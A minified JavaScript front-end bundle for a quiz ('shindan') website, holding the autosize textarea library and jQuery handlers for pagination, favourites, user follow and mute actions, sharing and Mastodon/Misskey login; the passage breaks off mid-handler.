/*! For license information please see app.js.LICENSE.txt */
(() => {
  var e,
    t = {
      9367: function (e, t) {
        var n, r, i;
        r = [e, t], n = function (e, t) {
          "use strict";

          var n,
            r,
            i = "function" == typeof Map ? new Map() : (n = [], r = [], {
              has: function (e) {
                return n.indexOf(e) > -1;
              },
              get: function (e) {
                return r[n.indexOf(e)];
              },
              set: function (e, t) {
                -1 === n.indexOf(e) && (n.push(e), r.push(t));
              },
              delete: function (e) {
                var t = n.indexOf(e);
                t > -1 && (n.splice(t, 1), r.splice(t, 1));
              }
            }),
            o = function (e) {
              return new Event(e, {
                bubbles: !0
              });
            };
          try {
            new Event("test");
          } catch (e) {
            o = function (e) {
              var t = document.createEvent("Event");
              return t.initEvent(e, !0, !1), t;
            };
          }
          function a(e) {
            if (e && e.nodeName && "TEXTAREA" === e.nodeName && !i.has(e)) {
              var t = null,
                n = null,
                r = null,
                a = function () {
                  e.clientWidth !== n && f();
                },
                u = function (t) {
                  window.removeEventListener("resize", a, !1), e.removeEventListener("input", f, !1), e.removeEventListener("keyup", f, !1), e.removeEventListener("autosize:destroy", u, !1), e.removeEventListener("autosize:update", f, !1), Object.keys(t).forEach(function (n) {
                    e.style[n] = t[n];
                  }), i.delete(e);
                }.bind(e, {
                  height: e.style.height,
                  resize: e.style.resize,
                  overflowY: e.style.overflowY,
                  overflowX: e.style.overflowX,
                  wordWrap: e.style.wordWrap
                });
              e.addEventListener("autosize:destroy", u, !1), "onpropertychange" in e && "oninput" in e && e.addEventListener("keyup", f, !1), window.addEventListener("resize", a, !1), e.addEventListener("input", f, !1), e.addEventListener("autosize:update", f, !1), e.style.overflowX = "hidden", e.style.wordWrap = "break-word", i.set(e, {
                destroy: u,
                update: f
              }), s();
            }
            function s() {
              var n = window.getComputedStyle(e, null);
              "vertical" === n.resize ? e.style.resize = "none" : "both" === n.resize && (e.style.resize = "horizontal"), t = "content-box" === n.boxSizing ? -(parseFloat(n.paddingTop) + parseFloat(n.paddingBottom)) : parseFloat(n.borderTopWidth) + parseFloat(n.borderBottomWidth), isNaN(t) && (t = 0), f();
            }
            function d(t) {
              var n = e.style.width;
              e.style.width = "0px", e.offsetWidth, e.style.width = n, e.style.overflowY = t;
            }
            function l(e) {
              for (var t = []; e && e.parentNode && e.parentNode instanceof Element;) e.parentNode.scrollTop && t.push({
                node: e.parentNode,
                scrollTop: e.parentNode.scrollTop
              }), e = e.parentNode;
              return t;
            }
            function c() {
              if (0 !== e.scrollHeight) {
                var r = l(e),
                  i = document.documentElement && document.documentElement.scrollTop;
                e.style.height = "", e.style.height = e.scrollHeight + t + "px", n = e.clientWidth, r.forEach(function (e) {
                  e.node.scrollTop = e.scrollTop;
                }), i && (document.documentElement.scrollTop = i);
              }
            }
            function f() {
              c();
              var t = Math.round(parseFloat(e.style.height)),
                n = window.getComputedStyle(e, null),
                i = "content-box" === n.boxSizing ? Math.round(parseFloat(n.height)) : e.offsetHeight;
              if (i < t ? "hidden" === n.overflowY && (d("scroll"), c(), i = "content-box" === n.boxSizing ? Math.round(parseFloat(window.getComputedStyle(e, null).height)) : e.offsetHeight) : "hidden" !== n.overflowY && (d("hidden"), c(), i = "content-box" === n.boxSizing ? Math.round(parseFloat(window.getComputedStyle(e, null).height)) : e.offsetHeight), r !== i) {
                r = i;
                var a = o("autosize:resized");
                try {
                  e.dispatchEvent(a);
                } catch (e) {}
              }
            }
          }
          function u(e) {
            var t = i.get(e);
            t && t.destroy();
          }
          function s(e) {
            var t = i.get(e);
            t && t.update();
          }
          var d = null;
          "undefined" == typeof window || "function" != typeof window.getComputedStyle ? ((d = function (e) {
            return e;
          }).destroy = function (e) {
            return e;
          }, d.update = function (e) {
            return e;
          }) : ((d = function (e, t) {
            return e && Array.prototype.forEach.call(e.length ? e : [e], function (e) {
              return a(e, t);
            }), e;
          }).destroy = function (e) {
            return e && Array.prototype.forEach.call(e.length ? e : [e], u), e;
          }, d.update = function (e) {
            return e && Array.prototype.forEach.call(e.length ? e : [e], s), e;
          }), t.default = d, e.exports = t.default;
        }, void 0 === (i = "function" == typeof n ? n.apply(t, r) : n) || (e.exports = i);
      },
      7080: (e, t, n) => {
        n(1689), n(3023), n(3470);
      },
      1689: (e, t, n) => {
        try {
          window.Popper = n(8981).default, window.$ = window.jQuery = n(9755), n(3734);
        } catch (e) {}
        window.axios = n(7218), window.axios.defaults.headers.common["X-Requested-With"] = "XMLHttpRequest";
      },
      3023: (e, t, n) => {
        "use strict";

        n.r(t);
        var r = n(5623),
          i = n(9367),
          o = n.n(i);
        n(9367), window.spinner = "spinner", window.btn_spinner = '<span class="spinner mr-2"><i class="fa-solid fa-' + spinner + ' fa-fw fa-spin"></i></span>', window.block_spinner = '<div class="p-3 text-muted text-center"><i class="fa-solid fa-' + spinner + ' fa-2x fa-spin"></i></div>', window.block_spinner_sm = '<div class="p-3 text-muted text-center"><i class="fa-solid fa-' + spinner + ' fa-spin"></i></div>';
        var a = {
            ja: {
              1: "1月",
              2: "2月",
              3: "3月",
              4: "4月",
              5: "5月",
              6: "6月",
              7: "7月",
              8: "8月",
              9: "9月",
              10: "10月",
              11: "11月",
              12: "12月"
            },
            en: {
              1: "Jan ",
              2: "Feb ",
              3: "Mar ",
              4: "Apr ",
              5: "May ",
              6: "Jun ",
              7: "Jul ",
              8: "Aug ",
              9: "Sep ",
              10: "Oct ",
              11: "Nov ",
              12: "Dec "
            }
          },
          u = {
            ja: {
              s: "s",
              m: "m",
              h: "h",
              d: "d",
              space: " ",
              day: ""
            },
            en: {
              s: "s",
              m: "m",
              h: "h",
              d: "d",
              space: " ",
              day: ""
            }
          };
        window.fadeTime = "fast", window.twemoji_asset = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/";
        var s = !1,
          d = !0;
        window.onfocus = function () {
          d = !0;
        }, window.onblur = function () {
          d = !1;
        }, window.parseJson = function (e) {
          var t = {},
            n = 0;
          for (n = 0; n < e.length; n++) t[e[n].name] = e[n].value;
          return t;
        }, $.ajaxSetup({
          headers: {
            "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content")
          }
        }), $(function () {
          $('[data-toggle="tooltip"]').tooltip(), $('[data-toggle="popover"]').popover(), _(null, [], !0), auth_check && $.ajax({
            url: "/mypage/checkMyNotification",
            type: "POST",
            dataType: "json"
          }).done(function (e) {
            e.notification && $.each(e.notification, function (e, t) {
              $("#" + e).append(t);
            });
          }).fail(function () {}), $(".modal").on("show.bs.modal", function (e) {
            $(".tooltip").tooltip("hide");
          }), "undefined" != typeof createCompleteModal && createCompleteModal && $("#modal-create_completed").modal("show"), "undefined" != typeof myFavoriteTagsUrl && myFavoriteTagsUrl && m(myFavoriteTagsUrl), lazyload(), "undefined" == typeof no_twemoji && r.Z.parse(document.body, {
            base: twemoji_asset
          }), navigator.share && $(".btn-webshareapi").show(), setTimeout(function () {
            adjustTimelineHeight(), adjustShindanTimelineHeight();
          }, 1e3), o()($("textarea"));
        }), $(window).on("load", function () {
          "undefined" != typeof shindan_type && "undefined" != typeof shindanResult && 1 == shindanResult && "ai" != shindan_type && (rti_sharable_setting(), $("#timeline_block").show().hide().fadeIn()), shindanDescriptionsHeight(), repalce_nbsp();
        }), window.repalce_nbsp = function () {
          $("#shindanResultContent,textarea").each(function () {
            var e = $(this).html();
            $(this).html(e.replace(/&nbsp;/g, " "));
          });
        };
        var l = 0;
        window.addEventListener("pageshow", function (e) {
          "undefined" != typeof shindanProgress && 1 == shindanProgress && e.persisted && (l = 0);
        }), $(document).on("click", "#shindanButtonSubmit", function () {
          if ("undefined" != typeof shindanProgress && 1 == shindanProgress) {
            $("#shindanProgressModal").modal("show");
            var e = Math.floor(100 / shindanProgressTime * 99),
              t = $("#shindanForm"),
              n = $("#shindanProgressBar"),
              r = setInterval(function () {
                l < 100 ? (l = l + e > 100 ? 100 : l + e, n.css("width", l + "%").prop("aria-valuenow", l)) : (clearInterval(r), setTimeout(function () {
                  n.css("width", "0%").prop("aria-valuenow", 0), $("#shindanProgressModal").modal("hide"), l = 0, t.off("submit"), t.submit();
                }, 500));
              }, 99);
            return !1;
          }
        }), window.htmlspecialchars = function () {
          return (arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "").replace(/["&'<>]/g, function (e) {
            return {
              "&": "&amp;",
              "'": "&#39;",
              '"': "&quot;",
              "<": "&lt;",
              ">": "&gt;"
            }[e];
          });
        }, window.htmlspecialchars_decode = function (e, t) {
          var n = 0,
            r = 0,
            i = !1;
          void 0 === t && (t = 2), e = e.toString().replace(/&lt;/g, "<").replace(/&gt;/g, ">");
          var o = {
            ENT_NOQUOTES: 0,
            ENT_HTML_QUOTE_SINGLE: 1,
            ENT_HTML_QUOTE_DOUBLE: 2,
            ENT_COMPAT: 2,
            ENT_QUOTES: 3,
            ENT_IGNORE: 4
          };
          if (0 === t && (i = !0), "number" != typeof t) {
            for (t = [].concat(t), r = 0; r < t.length; r++) 0 === o[t[r]] ? i = !0 : o[t[r]] && (n |= o[t[r]]);
            t = n;
          }
          return t & o.ENT_HTML_QUOTE_SINGLE && (e = e.replace(/&#0*39;/g, "'")), i || (e = e.replace(/&quot;/g, '"')), e = e.replace(/&amp;/g, "&");
        }, $(document).on("click", ".shareModal", function () {
          $("#shareModal").modal("show");
        }), $(document).on("click", "#share-copytext", function () {
          var e = $("#copyContent").find(".active").find("textarea").attr("id");
          navigator.clipboard.writeText($("#" + e).val()).then(function () {
            showAlertToast(clipboardtext_success, "success");
          }), $("#shareModal").modal("hide");
        }), $(document).on("click", "#share-copytext-shindanresult", function () {
          navigator.clipboard.writeText($("#share-copytext-shindanresult-textarea").val()).then(function () {
            showAlertToast(clipboardtext_success, "success");
          });
        }), $(document).on("click", "#copy-shindanUrl", function () {
          navigator.clipboard.writeText($("#copy-shindanUrl").val()).then(function () {
            showAlertToast(clipboardtext_success, "success");
          });
        }), $(document).on("click", ".clipboardtext", function () {
          var e = $(this).data("clipboardtext");
          null == navigator.clipboard ? window.clipboardData.setData("Text", e) : navigator.clipboard.writeText(e).then(function () {
            showAlertToast(clipboardtext_success, "success");
          });
        }), $(".modal").on("show.bs.modal", function (e) {
          $("#toast-container").empty();
        }), window.showAlertToast = function (e, t) {
          var n = Date.now();
          "success" == t && (t = "toast");
          var r = '<div id="toast-' + n + '" class="toast1 fixed-top hide"><div class="toast2 px-3"><div class="toast3 alert alert-' + t + ' p-4 align-content-center"><div class="d-flex justify-content-between align-items-start"><div class="toast-message d-inline-block pr-4 text-break">' + e + '</div><button data-toast_id="' + n + '" type="button" class="close close-toast" aria-label="Close">&times;</button></div></div></div>';
          $("#toast-container").html(r), setTimeout(function () {
            $("#toast-" + n).removeClass("hide");
          }, 100), setTimeout(function () {
            $("#toast-" + n).addClass("hide"), setTimeout(function () {
              $("#toast-" + n).remove();
            }, 1e3);
          }, 5e3);
        }, $(document).on("click", ".close-toast", function () {
          var e = $(this).data("toast_id");
          $("#toast-" + e).remove();
        }), $(function () {
          var e = !("undefined" == typeof shindanResult || !0 !== shindanResult || !$("#shindanResultBlock").length || 0 === $("#etc_buttons").length),
            t = 0,
            n = 0,
            r = 0,
            i = 0,
            o = $(window).height();
          $(window).scroll(function () {
            r = $(this).scrollTop(), e && (i = $("#title_and_result").offset().top + $("#title_and_result").outerHeight(), n = r + o / 3 * 2), Math.abs(t - r) >= 50 && (r > t && r > 10 ? "1" == $("#head-navbar").attr("autoHide") && ($("#head-navbar").addClass("hide"), $("#head-shindan-title").removeClass("hide")) : "1" == $("#head-navbar").attr("autoHide") && ($("#head-navbar").removeClass("hide"), $("#head-shindan-title").addClass("hide")), e && (n > i ? $("#foot-sharebar").removeClass("hide") : $("#foot-sharebar").addClass("hide")), t = r);
          });
        });
        var c = !1;
        $(window).on("load scroll", function () {
          if ("undefined" != typeof twitterSearchParam && h($("#" + twitterSearchParam.div)) && !twitterSearchParam.firstload && (twitterSearchParam.mode = "first", p(twitterSearchParam), twitterSearchParam.firstload = !0), "undefined" != typeof shindanLists && 1 == shindanLists) {
            if (void 0 === e) var e = "";
            h($("#shindansRelatedListsContainer")) && !shindanListsDisplayed && $.ajax({
              url: "/shindansRelatedListsAll",
              type: "POST",
              dataType: "json",
              data: {
                shindanListsTarget,
                shindan_info
              }
            }).done(function (e) {
              $.each(e, function (e, t) {
                t.html.title && $("#shindansRelatedLists-" + e + "-title").html(t.html.title).hide().fadeIn(fadeTime), t.html.content && $("#shindansRelatedLists-" + e).html(t.html.content).hide().fadeIn(fadeTime);
              }), $('[data-toggle="tooltip"]').tooltip(), shindanListsDisplayed = !0, lazyload(), r.Z.parse(document.getElementById("shindansRelatedListsContainer"), {
                base: twemoji_asset
              });
            }).fail(function () {});
          }
          "undefined" != typeof shindanResult && !0 === shindanResult && 0 == c && h($("#shindanResultContent")) && setTimeout(function () {
            if ("undefined" != typeof chartParams) {
              var e = Object.keys(chartParams).length;
              $.each(chartParams, function (t, n) {
                drawChart(t, n, e);
              });
            }
            shindanEffects(), c = !0;
          }, 700);
        }), $(document).on("click", ".shindansRelatedLists-tab", function () {
          var e = $(this).attr("id").replace("shindansRelatedLists-tab-", "");
          -1 == $.inArray(e, shindanListsDisplayedSub) && ($("#shindansRelatedLists-" + e).html(block_spinner), function (e) {
            $.ajax({
              url: "/shindansRelatedLists",
              type: "POST",
              dataType: "json",
              data: {
                mode: e,
                shindan_info
              }
            }).done(function (t) {
              t.html.content ? $("#shindansRelatedLists-" + e).html(t.html.content).hide().fadeIn(fadeTime) : $("#shindansRelatedLists-" + e).empty(), $('[data-toggle="tooltip"]').tooltip(), lazyload(), r.Z.parse(document.getElementById("shindansRelatedListsContainer"), {
                base: twemoji_asset
              });
            }).fail(function () {
              $("#shindansRelatedLists-" + e).empty();
            });
          }(e), shindanListsDisplayedSub.push(e));
        }), $(function () {
          if ("undefined" != typeof shindanResult && !0 === shindanResult && "undefined" != typeof twitterSearchParams) {
            window.twitterSearchParam = twitterSearchParams.shindan;
          }
          "undefined" != typeof twitterSearchParam && setInterval(function () {
            var e;
            d && h($("#" + twitterSearchParam.div), !1) && twitterSearchParam.firstload && (e = parseInt(Date.now() / 1e3), $.each($(".tweet-row"), function (t, n) {
              var r = $(n).attr("id").replace("tweet-row-", ""),
                i = $("#tweet-hidden-time-" + r).text(),
                o = e - i;
              if (o < 60) var s = o + u[twitterSearchParam.lang].s;else if (o < 3600) s = parseInt(o / 60) + u[twitterSearchParam.lang].m;else if (o < 86400) s = parseInt(o / 3600) + u[twitterSearchParam.lang].h;else {
                var d = new Date(1e3 * i),
                  l = d.getMonth() + 1,
                  c = d.getDate();
                s = a[twitterSearchParam.lang][l] + u[twitterSearchParam.lang].space + c + u[twitterSearchParam.lang].day;
              }
              $("#tweet-time-" + r).text(s);
            }));
          }, 2e4);
        });
        var f = [];
        function h(e) {
          var t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
          if (0 === e.length) return !1;
          var n = $(e).attr("id");
          if (t && $.inArray(n, f) >= 0) return !1;
          var r = $(window).scrollTop(),
            i = r + $(window).height(),
            o = e.offset().top - $(window).height(),
            a = o + e.height() + $(window).height();
          return i > o && r < a && (t && f.push(n), !0);
        }
        function p(e) {
          $.ajax({
            url: "/twitterSearch",
            type: "POST",
            dataType: "json",
            data: e
          }).done(function (t) {
            "first" == e.mode ? ($(t.html).prependTo("#" + e.div).hide().fadeIn(fadeTime), e.next_results = t.next_results, t.tweet_max_id && (e.tweet_max_id = t.tweet_max_id), t.shindan_max_id && (e.shindan_max_id = t.shindan_max_id), e.refresh_url = t.refresh_url, t.tweet_since_id && (e.tweet_since_id = t.tweet_since_id), t.tweet_since_timestamp && (e.tweet_since_timestamp = t.tweet_since_timestamp), t.shindan_since_id && (e.shindan_since_id = t.shindan_since_id)) : "refresh" == e.mode ? ($(t.html).prependTo("#" + e.div).hide().fadeIn(fadeTime), e.refresh_url = t.refresh_url, t.tweet_since_id && (e.tweet_since_id = t.tweet_since_id), t.tweet_since_timestamp && (e.tweet_since_timestamp = t.tweet_since_timestamp), t.shindan_since_id && (e.shindan_since_id = t.shindan_since_id), $.each($(".tweet-row"), function (t, n) {
              t > 300 * e.count && $(n).remove();
            }), 1 == e.manual && $("#new_tweets").empty()) : "refresh_check" == e.mode ? $("#new_tweets").html(t.new_tweets).hide().fadeIn(fadeTime) : ($("#tweet-update-next-block").remove(), $(t.html).appendTo("#" + e.div).hide().fadeIn(fadeTime), e.next_results = t.next_results, t.tweet_max_id && (e.tweet_max_id = t.tweet_max_id), t.shindan_max_id && (e.shindan_max_id = t.shindan_max_id)), lazyload(), void 0 !== e.div && r.Z.parse(document.getElementById(e.div), {
              base: twemoji_asset
            });
          });
        }
        function m(e) {
          var t;
          t = "undefined" != typeof myFavoriteTag && myFavoriteTag ? myFavoriteTag : "", $.ajax({
            type: "post",
            url: htmlspecialchars_decode(e, 3),
            data: {
              tag: t
            },
            dataType: "json",
            success: function (e) {
              $(e.html).appendTo("#myFavoriteTags").hide().fadeIn(fadeTime);
            }
          });
        }
        function g(e) {
          $(".user-avatar-" + e.account_id).attr("src", e.avatar), $(".user-name" + e.account_id).text(e.name), $(".user-screen_name" + e.account_id).text(e.screen_name), $(".user-description" + e.account_id).text(e.description);
        }
        function v(e) {
          $("#modal-common-title").html(e.title), $("#modal-common-body").html(e.body), $("#modal-common-btn").html(e.btn);
        }
        if ($(document).on("click", "#tweet-update-next", function () {
          $(this).children("i").remove(), $(this).remove("i").prepend(btn_spinner).prop("disabled", !0), twitterSearchParam.mode = "next", p(twitterSearchParam);
        }), $(document).on("click", "#tweet-update-refresh", function () {
          $(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), twitterSearchParam.mode = "refresh", twitterSearchParam.manual = !0, p(twitterSearchParam);
        }), $(document).on("click", ".nav-link-twitter-search", function () {
          if (void 0 === e) var e = "shindan";
          var t = e,
            n = $(this).attr("href").replace("#twitterSearchBlock-", "");
          twitterSearchParams[t] = twitterSearchParam, twitterSearchParam = twitterSearchParams[n], e = n, twitterSearchParam.firstload ? (twitterSearchParam.mode = "refresh", p(twitterSearchParam)) : (twitterSearchParam.mode = "first", p(twitterSearchParam), twitterSearchParam.firstload = !0);
        }), $(document).on("click", "#next-shindan-list", function () {
          if ("undefined" != typeof nextPageUrl) {
            if ($(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), void 0 !== $(this).data("lastnumber")) var e = $(this).data("lastnumber");else e = 0;
            $.ajax({
              type: "post",
              url: htmlspecialchars_decode(nextPageUrl, 3),
              data: {
                lastnumber: e,
                request_type: "async"
              },
              dataType: "json",
              success: function (e) {
                $("#next-shindan-list-block").remove(), $(e.html).appendTo("#shindan-index").hide().fadeIn(fadeTime), nextPageUrl = e.nextPageUrl, lazyload(), $('[data-toggle="tooltip"]').tooltip(), r.Z.parse(document.getElementById("shindan-index"), {
                  base: twemoji_asset
                });
              }
            });
          }
        }), $(document).on("click", "#next-users", function () {
          var e = $(this).data("nextpageurl"),
            t = $(this).data("rownumber"),
            n = $(this).data("insert_target");
          $(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), $.ajax({
            type: "post",
            url: htmlspecialchars_decode(e, 3),
            data: {
              rownumber: t
            },
            dataType: "json",
            success: function (e) {
              $("#next-users-block").remove();
              var t = n ? "#" + n : "#users-index";
              $(e.html).appendTo(t).hide().fadeIn(fadeTime), lazyload(), r.Z.parse(document.getElementById(t), {
                base: twemoji_asset
              });
            }
          });
        }), $(document).on("click", "#next-results", function () {
          "undefined" != typeof nextPageUrl && ($(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), $.ajax({
            type: "post",
            url: htmlspecialchars_decode(nextPageUrl, 3),
            dataType: "json",
            success: function (e) {
              $("#next-results-block").remove(), $(e.html).appendTo("#results-rows").hide().fadeIn(fadeTime), nextPageUrl = e.nextPageUrl, lazyload(), adjustTimelineHeight(), $('[data-toggle="tooltip"]').tooltip(), r.Z.parse(document.getElementById("results-rows"), {
                base: twemoji_asset
              });
            }
          }));
        }), $(document).on("click", "#myFavoriteTagsNext", function () {
          m($(this).data("myfavoritetagsnext")), $(this).remove();
        }), $(document).on("click", "#next-pics", function () {
          var e = $(this).data("next_page_url");
          void 0 !== e && ($(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), $.ajax({
            type: "post",
            url: htmlspecialchars_decode(e, 3),
            dataType: "json",
            success: function (e) {
              $("#next-pics-block").remove(), $(e.html).appendTo("#pics-index").hide().fadeIn(fadeTime);
            }
          }));
        }), $(document).on("click", ".pics-delete-confirm", function () {
          var e = $(this).data("pic_id"),
            t = '<img class="img-thumbnail w-50" src=' + $(this).data("pic_src") + ">";
          $("#pic_delete_modal_pic").html(t), $("#pic_delete_submit").data("pic_id", e), $("#pic_delete_modal").modal("show");
        }), $(document).on("click", "#pic_delete_submit", function () {
          var e = $(this).data("pic_id");
          $.ajax({
            type: "post",
            url: "/mypage/pics/delete",
            data: {
              pic_id: e
            },
            dataType: "json"
          }).done(function (t) {
            $("#pic-row-" + e).fadeOut(1500), setTimeout(function () {
              $("#pic-row-" + e).remove();
            }, 2e3), showAlertToast(t.message, "success");
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(function () {
          "undefined" != typeof chartPage && 1 == chartPage && $.ajax({
            type: "post",
            url: "/getChart",
            data: {
              chart
            },
            dataType: "json",
            success: function (e) {
              $("#chartWrapper").html(e.string);
              var t = e.chartScripts,
                n = Object.keys(t).length;
              $.each(t, function (e, t) {
                drawChart(e, t, n);
              });
            }
          });
        }), $(document).on("click", ".rowup", function () {
          var e = $(this).closest("tr"),
            t = e.prev("tr");
          $(".social_users_row").length > 1 && e.prev.length && (e.insertBefore(t).hide().fadeIn("slow"), $("#social_users_order_submit").show().hide().fadeIn("slow"));
        }), $(document).on("click", ".rowdown", function () {
          var e = $(this).closest("tr"),
            t = e.next("tr");
          $(".social_users_row").length > 1 && t.length && (e.insertAfter(t).hide().fadeIn("slow"), $("#social_users_order_submit").show().hide().fadeIn("slow"));
        }), $(document).on("click", "#auth_misskey_go", function () {
          var e = $("#auth_misskey_server").val();
          if (0 == /^([a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9]*\.)+[a-zA-Z]{2,}$/.test(e) || 0 == e.length) {
            var t = $(this).data("domain_error");
            return $("#auth_misskey_go_error").text(t), !1;
          }
          var n = $(this).data("route"),
            r = $(this).data("action"),
            i = document.createElement("form");
          i.action = r, i.method = "post";
          var o = document.createElement("input");
          o.type = "hidden", o.name = "route", o.value = n;
          var a = document.createElement("input");
          a.type = "hidden", a.name = "host", a.value = e;
          var u = document.createElement("input");
          u.type = "hidden", u.name = "_token", u.value = $('meta[name="csrf-token"]').attr("content"), i.appendChild(o), i.appendChild(a), i.appendChild(u), document.body.appendChild(i), i.submit();
        }), $(document).on("click", "#auth_mastodon_go", function () {
          var e = $("#auth_mastodon_server").val();
          if (0 == /^([a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9]*\.)+[a-zA-Z]{2,}$/.test(e) || 0 == e.length) {
            var t = $(this).data("domain_error");
            return $("#auth_mastodon_go_error").text(t), !1;
          }
          var n = $(this).data("action"),
            r = document.createElement("form");
          r.action = n, r.method = "post";
          var i = document.createElement("input");
          i.type = "hidden", i.name = "host", i.value = e;
          var o = document.createElement("input");
          o.type = "hidden", o.name = "_token", o.value = $('meta[name="csrf-token"]').attr("content"), r.appendChild(i), r.appendChild(o), document.body.appendChild(r), r.submit();
        }), $(document).on("click", ".inPageLink", function () {
          var e = $(this).attr("href"),
            t = $("#" == e || "" == e ? "html" : e).offset().top - 15;
          return $("body,html").animate({
            scrollTop: t
          }, 400, "swing"), !1;
        }), $(document).on("click", ".user-modal-show", function () {
          var e = $(this).data("account_id"),
            t = $(this).data("mode");
          $("#modal-user-card").empty(), $.ajax({
            url: "/getUserCard",
            type: "POST",
            dataType: "json",
            data: {
              account_id: e,
              mode: t
            }
          }).done(function (t) {
            t.status ? (t.userData && g(t.userData), $("#modal-user-card").html(t.html), $("#modal-user").modal("show"), $('[data-toggle="tooltip"]').tooltip(), lazyload(), r.Z.parse(document.getElementById("modal-user-card"), {
              base: twemoji_asset
            })) : ($("#user-row-" + e).find("a,.a").addClass(["text-muted-more", "disabled"]).removeClass("user-modal-show"), $("#user-row-" + e).find("button").prop("disabled", !0), showAlertToast(t.message, "danger"));
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(document).on("click", ".btn-action-user", function () {
          var e = $(this).data("account_id"),
            t = $(this).data("action");
          $(this).prop("disabled", !0), $.ajax({
            url: "/userAction",
            type: "POST",
            dataType: "json",
            data: {
              account_id: e,
              action: t
            },
            context: $(this)
          }).done(function (t) {
            if ("needLogin" == t.status) return $(this).prop("disabled", !1), function () {
              $(".modal").hasClass("show") && $(".modal").modal("hide");
              $("#needLoginModal").modal("show");
            }(), !1;
            "success" == t.status && ("follow" == t.actionType && ($(".btn-action-user-follow-" + e).data("action", t.nextAction), $(".btn-action-user-follow-" + e).removeClass(t.removeClass), $(".btn-action-user-follow-" + e).addClass(t.addClass), $(".btn-action-user-follow-" + e).html(t.html), t.myFollowIcon ? $(".user-authorLabel-" + e).append(t.myFollowIcon) : $(".user-followIcon-" + e).remove()), "mute" == t.actionType && ($(".btn-action-user-mute-" + e).data("action", t.nextAction), $(".btn-action-user-mute-" + e).html(t.html), t.myMuteIcon ? $(".user-authorLabel-" + e).append(t.myMuteIcon) : $(".user-muteIcon-" + e).remove())), t.noUser ? ($("#user-row-" + e).find("a").addClass(["text-muted-more", "disabled"]).removeClass("user-modal-show"), $("#user-row-" + e).find("button").prop("disabled", !0)) : $(this).prop("disabled", !1), t.userData && g(t.userData);
          }).fail(function () {
            showAlertToast("Error", "danger"), $(this).prop("disabled", !1);
          });
        }), $(document).on({
          mouseenter: function () {
            $(this).addClass("btn-dark"), $(this).removeClass("btn-light"), $(this).children(".btn-front").hide(), $(this).children(".btn-back").show();
          },
          mouseleave: function () {
            $(this).addClass("btn-light"), $(this).removeClass("btn-dark"), $(this).children(".btn-back").hide(), $(this).children(".btn-front").show();
          }
        }, ".btn-following"), $(document).on({
          mouseenter: function () {
            $(this).addClass("btn-light"), $(this).removeClass("btn-danger"), $(this).children(".btn-front").hide(), $(this).children(".btn-back").show();
          },
          mouseleave: function () {
            $(this).addClass("btn-danger"), $(this).removeClass("btn-light"), $(this).children(".btn-back").hide(), $(this).children(".btn-front").show();
          }
        }, ".btn-muting"), $(document).on("click", ".delete-shindan", function () {
          var e = $(this).data("shindan_id"),
            t = $(this).data("title");
          $("#shindan_delete_modal_shindan_id").text(e), $("#shindan_delete_modal_shindan_title").text(t), $("#shindan_delete_submit").data("shindan_id", e), $("#shindan_delete_modal").modal("show");
        }), $(document).on("click", "#shindan_delete_submit", function () {
          var e = $(this).data("shindan_id");
          $("#shindan_delete_modal").modal("hide"), $.ajax({
            url: "/deleteShindan",
            type: "POST",
            dataType: "json",
            data: {
              shindan_id: e
            },
            context: $(this)
          }).done(function (t) {
            "undefined" != typeof pageType && "shindandata" == pageType ? ($("#shindandata").fadeOut(1500), setTimeout(function () {
              window.location.href = "/mypage/shindans";
            }, 3e3)) : "success" == t.status && ($("#shindan-row-" + e).fadeOut(1500), setTimeout(function () {
              $("#shindan-row-" + e).remove();
            }, 2e3)), showAlertToast(t.message, t.status);
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(document).on("click", ".favorite-modal-show", function () {
          var e = $(this).data("shindan_id");
          $.ajax({
            url: "/getFavoriteInfo",
            type: "POST",
            dataType: "json",
            data: {
              shindan_id: e
            },
            context: $(this)
          }).done(function (e) {
            $("#modal-favorite-title").html(e.title), $("#modal-favorite-body").html(e.body), $("#modal-favorite-btn").html(e.btn), e.modal_common && v(e.modal_common), $("#modal-favorite").modal("show");
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(document).on("click", ".favorite-delete-confirm", function () {
          var e = $(this).data("shindan_id");
          $.ajax({
            url: "/deleteFavoriteConfirm",
            type: "POST",
            dataType: "json",
            data: {
              shindan_id: e
            }
          }).done(function (e) {
            e.modal_common && v(e.modal_common), $("#modal-common").modal("show");
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(document).on("click", "#saveFavorite", function () {
          var e = $(this).data("shindan_id"),
            t = $("#addFavoriteTags").val();
          if ($("#addFavorite_private").prop("checked")) var n = !0;else n = !1;
          $.ajax({
            url: "/saveFavorite",
            type: "POST",
            dataType: "json",
            data: {
              shindan_id: e,
              favorite_tag: t,
              favorite_private: n
            },
            context: $(this)
          }).done(function (t) {
            $(".label-favorite-container-index-" + e).html(t.favoriteLabelIndex), $(".label-favorite-container-shindan-" + e).html(t.favoriteLabelShindan), $(".favorite-btn-" + e).addClass(t.favoriteButton.btn_class_add), $(".favorite-btn-" + e).removeClass(t.favoriteButton.btn_class_remove), $(".favorite-icon-" + e).addClass(t.favoriteButton.icon_class_add), $(".favorite-icon-" + e).removeClass(t.favoriteButton.icon_class_remove), $(".favorite-text-" + e).text(t.favoriteButton.text), $(".favorite-num-" + e).text(t.favoritesNum), $(".favorite-roundnum-" + e).html(t.favoritesRoundNum), $(".favorite-btn-" + e).attr("title", t.favoriteButton.long_text), $(".favorite-btn-" + e).attr("data-original-title", t.favoriteButton.long_text), $(".favorite-roundnum-withMargin-" + e).html(t.favoritesRoundNumWithMargin), $(".favorite-long_text-" + e).text(t.favoriteButton.long_text), showAlertToast(t.message, "success");
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), $(document).on("click", "#deleteFavoriteConfirm", function () {
          $("#modal-common").modal("show");
        }), $(document).on("click", "#deleteFavoriteSubmit", function () {
